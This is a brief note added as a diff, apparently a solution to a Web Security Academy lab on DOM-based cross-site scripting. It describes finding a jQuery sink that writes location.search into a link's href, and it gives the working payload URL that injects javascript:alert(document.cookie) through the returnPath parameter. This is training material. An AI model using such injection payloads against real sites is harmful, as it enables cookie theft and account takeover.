@@ -1,0 +1,5 @@
+// Search for window.location.search in page's javascript code
+// Found JQuery function putting location.search into <a>'s href attribute
+// Confirm by searching in DOM for random input in location.search 
+// Payload used:
+https://ac331f711ee6d806809799530018009c.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
